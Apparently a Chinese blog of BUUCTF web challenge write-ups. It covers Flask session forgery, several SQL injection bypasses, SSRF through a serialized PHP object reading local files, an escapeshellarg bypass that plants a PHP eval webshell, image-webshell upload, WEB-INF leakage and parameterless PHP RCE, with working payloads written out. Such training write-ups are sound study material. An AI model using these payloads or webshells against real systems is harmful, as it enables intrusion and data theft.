title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">HCTF2018-admin_迷风小白-CSDN博客</a></p><p>注册个账户登录后可以在修改密码页面的源码注释中找到提示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723145616780.png" alt=" "></p><p>查看可以找到题目源码</p><p><strong>一、 session伪造</strong></p><p>flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164939605.png" alt="image-20210723164939605"></p><p>找到session后利用py脚本进行解码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163354906.png" alt="image-20210723163354906"></p><p>依照题意可以猜测只有用admin账户登录才能得到flag，所以要伪造session来使我们被认为是admin账户</p><p>重新编码session时需要用到secret_key可以在config.py中找到</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163710686.png" alt="image-20210723163710686"></p><p>伪造session</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163828745.png" alt="image-20210723163828745"></p><p>修改后刷新页面得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164748497.png" alt="image-20210723164748497"></p><p><strong>二：Unicode欺骗</strong></p><p>代码审计可以看出在登录注册和修改密码时都存在用户名的小写转换</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723165801699.png" alt="image-20210723165801699"></p><p>看一下strlower</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723170037720.png" alt="image-20210723170037720"></p><p><code>Twisted</code>版本为<code>10.2.0</code>，而目前(2020/10/28)<code>Twisted</code>最新版本已有<code>20.3.0</code>，这里使用的版本非常旧<br><code>10.2.0</code>版的<code>nodeprep.prepare()</code>对一些特殊的<code>Unicode</code>编码处理后会得到一个正常的字符。可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a。</p><p>所以可以注册一个ᴬᴰᴹᴵᴺ用户再通过登录和修改密码两次令其变为admin</p><p><a href="https://unicode-table.com/en/">Basic Latin — ✔️ ❤️ ★ Unicode Character Table (unicode-table.com)</a>可以从这个网站查字符</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172720848.png" alt="image-20210723172720848"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172812674.png" alt="image-20210723172812674"></p><p>这里登录之后进行修改密码，则通过小写转换就会变为修改admin账户的密码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723181917454.png" alt="image-20210723181917454"></p><p><strong>三、弱密码</strong></p><p>用户admin密码为123</p><p>爆破或者试一试就能试出来密码</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进入后只有一个提交框，没啥思路，先用bp抓个包</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205715453.png" alt="image-20210723205715453"></p><p>看见有个hint</p><p>select * from &#39;admin&#39; where password=md5($pass,true)</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205633361.png" alt="image-20210723205633361"></p><p>然后猜这里应该要利用sql注入的，但我不会了x</p><p>看了一下说是要用ffifdyop来绕过，因为这个字符串经过md5之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是&#39; or &#39;6</p><p>就会构成万能密码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210730068.png" alt="image-20210723210730068"></p><p>成功进入下一步，先查看源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210837745.png" alt="image-20210723210837745"></p><p>利用md5不能处理数组会返回null的特性就能绕过，接下来进行代码审计</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210915141.png" alt="image-20210723210915141"></p><p>同样可以利用md5不能处理数组的特性</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723211130123.png" alt="image-20210723211130123"></p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>sql注入，先用fuzz测一下过滤（buu的网站好像有post限制，所以post到后面之后会显示提交次数过多，而且不知道是不是bp的问题有些没有过滤的也会被显示为被过滤了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724095707401.png" alt="image-20210724095707401"></p><p>这里应该要采用bool盲注的方式，但是过滤的东西有点多</p><p>因为空格被过滤了所以要利用（）来代替空格</p><p>抄了个脚本</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724131620633.png" alt="image-20210724131620633"></p><p>感觉是很简单的盲注，然后要利用python编脚本</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p> <a href="https://blog.csdn.net/qq_45521281/article/details/107167452">GXYCTF2019]BabySQli——“绕过md5比较”_WHOAMIAnony的博客-CSDN博客</a></p><p>当用户名为admin时，提示密码错误，因此能知道用户名为admin</p><p>登录后跳转到search.php中，在源码里存在一个进行base加密的提示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724153525231.png" alt="image-20210724153525231"></p><p>sql注入，先fuzz看一下过滤</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724152502898.png" alt="image-20210724152502898"></p><p>然后可以利用大写绕过查到共有3列（其实直接union试也可以</p><p>之后要利用联合注入</p><p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724152803276.png" alt="image-20210724152803276"></p><p>后端代码</p><pre class="language-none"><code class="language-none">&lt;?php$row;$pass&#x3D;$_POST[&#39;pw&#39;];if($row[&#39;username&#39;]&#x3D;&#x3D;’admin’)&#123;if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo “wrong pass!”; &#125;&#125;else&#123; echo “wrong user!”;&#125;</code></pre><p>所以可以在联合查询时构造虚拟的数据利用这个数据进行登录操作</p><pre class="language-none"><code class="language-none">username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #password&#x3D;123</code></pre><p>得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724153406008.png" alt="image-20210724153406008"></p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先join一下，然后源码里有</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724215234506.png" alt="image-20210724215234506"></p><p>这里过滤了union select 中间可以加个注释符来当空格来绕过去</p><p>这个页面存在注入点，最终可以查到这些</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724221156289.png" alt="image-20210724221156289"></p><p>这里能看出来data是个序列化后的结果，但是不知道有什么用</p><p>然后扫一下发现</p><p>有robots.txt备份文件</p><pre class="language-none"><code class="language-none">&lt;?phpclass UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;    function get($url)    &#123;        $ch &#x3D; curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output &#x3D; curl_exec($ch);        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;&#125;</code></pre><p>好，看不懂了（</p><p>抄一下别人的分析</p><pre class="language-none"><code class="language-none">&lt;?php  class UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;     public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;     function get($url)    &#123;        $ch &#x3D; curl_init();        &#x2F;*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*&#x2F;         curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        &#x2F;*            curl_setopt — 为给定的cURL会话句柄设置一个选项。                说明：                    bool curl_setopt ( resource $ch , int $option , mixed $value )                参数:                    ch：由 curl_init() 返回的 cURL 句柄。                    option：需要设置的CURLOPT_XXX选项。                    value：将设置在option选项上的值。                    对于下面的这些option的可选参数，value应该被设置一个bool类型的值：                        CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。                    对于下面的这些option的可选参数，value应该被设置一个string类型的值：                        CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。                                                                          ###################                        文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流        *&#x2F;        $output &#x3D; curl_exec($ch);        &#x2F;*curl_exec ：执行 cURL 会话*&#x2F;        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        &#x2F;*            curl_getinfo — 获取一个cURL连接资源句柄的信息                说明：                       mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )获取最后一次传输的相关信息。                参数：                      ch 由 curl_init() 返回的 cURL 句柄。                      opt：这个参数可能是以下常量之一:                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码        *&#x2F;                 if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);         return $output;    &#125;     public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;     public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;        cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。    cURL还包含了用于程序开发的libcurl。PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。PHP中使用cURL实现Get和Post请求的方法这些函数在PHP 4.0.2中被引入。 </code></pre><p>新知识：这里利用了ssrf漏洞</p><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/88983921"> SSRF 漏洞记录_发哥微课堂-CSDN博客</a></p><p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势) - T00ls.Net</a></p><p>SSRF（Server-Side Request Forgery）也属于应用层上的一个漏洞类型，用一个最简单的例子来理解这个漏洞：比如一个添加图文的功能，填入标题内容和封面图然后提交在网站前台显示，对于这个功能的图片它除了可以让你上传以外，还支持填入远程图片地址，如果你填入了远程的图片地址，则该网站会加载远程图过来进行显示，而如果程序写法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件，或者你输入内网的 ip 或者一些系统的文件都会被解析执行，这个我们一般叫它 SSRF 即服务端请求伪造。</p><p>curl 使用的经典过程，初始化，然后设置访问的地址，随后执行，最后关闭。</p><p>将URL换成file://的形式，就可以读取本地文件。</p><p>这里我们要访问的是flag.php，所以按照之前sql注入得出来的序列化内容进行修改</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225352853.png" alt="image-20210724225352853"></p><p>最终payload为</p><pre class="language-none"><code class="language-none">?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</code></pre><p>看一下源码，找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225327036.png" alt="image-20210724225327036"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225342961.png" alt="image-20210724225342961"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>这个看起来和强网杯那个有点像</p><p>同样也是堆叠注入</p><p>可以用</p><p>1&#39;;show tables;#查表</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725230626425.png" alt="image-20210725230626425"></p><p>flag应该就在flaghere这个表里</p><p>看一下列名</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231110024.png" alt="image-20210725231110024"></p><p>想查看的时候发现存在过滤</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231208544.png" alt="image-20210725231208544"></p><p>这里可以利用headler</p><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><p>最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p><p>（试了一下利用headler强网杯的拿到也能注出来</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231720309.png" alt="image-20210725231720309"></p><p><strong>关于handler命令</strong><br>转载自:<a href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p><p>基本语法：</p><pre class="language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE</code></pre><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p><p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p><p>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>这个和之前一个文件上传的题差不多，上传时过滤了ph后缀名，所以要上传个图片马，同时还要上传个.htaccess文件解析图片马，用bp抓包把类型改成image/jpeg就行</p><p>然后菜刀练一下在根目录里就能找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210803230538636.png" alt="image-20210803230538636"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>先直接贴参考的文章了</p><p>[BUUCTF__<a href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/weixin_44077544/article/details/102835099?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">BUUCTF 2018]Online Tool_沐目的博客-CSDN博客</a></p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)</a></p><p>[2020/7/08 - <a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客</a></p><p>先是代码审计，又是没见过的东西</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804001517374.png" alt="image-20210804001517374"></p><p>第一个if语句好像没啥用</p><p>在PHP 中使用 <em><strong>*$_SERVER[&quot;REMOTE_ADDR&quot;]*</strong></em> 来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就</p><p>是代理服务器的 IP 地址，而不是真正的客户端 IP 地址。要想透过代理服务器取得客户端的真实 IP 地址，就要使用</p><p><em><strong>*$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]*</strong></em> 来读取。</p><p>不过要注意的事，并不是每个代理服务器都能用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取客户端的真实IP，有些用此</p><p>方法读取到的仍然是代理服务器的 IP。</p><p>第二个if语句是要求传入一个参数然后利用escapeshellarg和escapeshellcmd两个函数的漏洞实现system命令执行</p><pre class="language-none"><code class="language-none">&#96;escapeshellarg&#96;，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#96;&#39;\&#39;&#96; ，若已经用&#96;\&#96;转义，则会用并且用&#96;&#39;\&#39;&#96; 替换&#96;\&#96;，最后将整个变量用单引号包裹。escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转义（成对存在闭合的双引号或单引号除外）若已被转义，则用&#96;\\\&quot;&#96;或&#96;\\\&#39;&#96;替&#96;\&quot;&#96;或&#96;\&#39;</code></pre><p>这个漏洞类似这种</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804005109985.png" alt="image-20210804005109985"></p><p>mkdir命令是Linux中的新建文件夹</p><p>chdir改变目录</p><p>最后就是system的命令执行了，这里面是nmap的一些命令</p><p>-T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4</p><p>-sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试</p><p>-Pn :禁用ping</p><p>-host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。</p><p>-F :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p><p>-oG test.txt: 将扫描结果生成 test.txt 文件</p><p>接下来就是想办法利漏洞给里面传入一个一句话木马</p><p>payload</p><pre class="language-none"><code class="language-none">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre><p>然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种</p><pre class="language-none"><code class="language-none">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre><p>这里单引号都闭合了不会影响到传入的一句话木马</p><p>之后就可以用菜刀连接找flag了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004604659.png" alt="image-20210804004604659"></p><p> e9612257fa1c5134d014e95a7440d357</p><p>这是上传后的地址</p><p>菜刀连一下<a href="http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/">http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/</a> e9612257fa1c5134d014e95a7440d357/1.php</p><p>根目录找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004814988.png" alt="image-20210804004814988"></p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>首先是个登录框</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124202495.png" alt="image-20210808124202495"></p><p>看一下help的内容</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124233134.png" alt="image-20210808124233134"></p><p>试试抓包然后改一下请求方式后会下载一个word文档，没啥用</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124659707.png" alt="image-20210808124659707"></p><p>这里有个漏洞WEB-INF/web.xml泄露</p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>漏洞成因</p><pre class="language-none"><code class="language-none">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！</code></pre><p>漏洞利用</p><pre class="language-none"><code class="language-none">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>所以先访问一下WEB-INF/web.xml</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808125056946.png" alt="image-20210808125056946"></p><p>这个路径com.wm.ctf.IndexController应该和flag有关</p><p>所以试试访问一下</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131605144.png" alt="image-20210808131605144"></p><p>看到有块类似base64</p><p>解码得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131703878.png" alt="image-20210808131703878"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>[(1条消息) BUU-WEB-<a href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p><p>题目存在git泄露，用GitHack扫一下得到源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808134953571.png" alt="image-20210808134953571"></p><p>可以猜到这里利用了eval进行命令执行，但是过滤了很多东西</p><pre class="language-none"><code class="language-none">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。2.过滤了常用的几个伪协议，不能以伪协议读取文件。3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE</code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">PHP Parametric Function RCE · sky&#39;s blog (skysec.top)</a>关于无参数rce</p><p>首先要读取目录内容，</p><p>可以用print_r(scandir(&#39;.&#39;));</p><p>但是因为不能传参，所以要想把.用函数代替</p><p>这里有两个函数可以利用</p><pre class="language-none"><code class="language-none">localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值</code></pre><p>所以current(localeconv())永远是个.</p><p>也就可以用print_r(scandir(current(localeconv())));来读目录</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808142444979.png" alt="image-20210808142444979"></p><p>可以看到flag就在flag.php中</p><p>现在要想办法把它读出来</p><p>这里可以利用array_reverse()和next函数</p><p>通过array_reverse() 函数返回翻转顺序的数组。<br>（反转之后flag.php被放在第二个数组之中）<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>payload为：</p><pre class="language-php" data-language="php"><code class="language-php">？exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144017189.png" alt="image-20210808144017189"></p><p>也可以利用</p><p>array_flip()交换数组的键和值</p><p>array_rand()从数组中随机取出一个或多个单元</p><p>最后再利用readfile函数读出文件或者用show_source让它高亮显示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144253823.png" 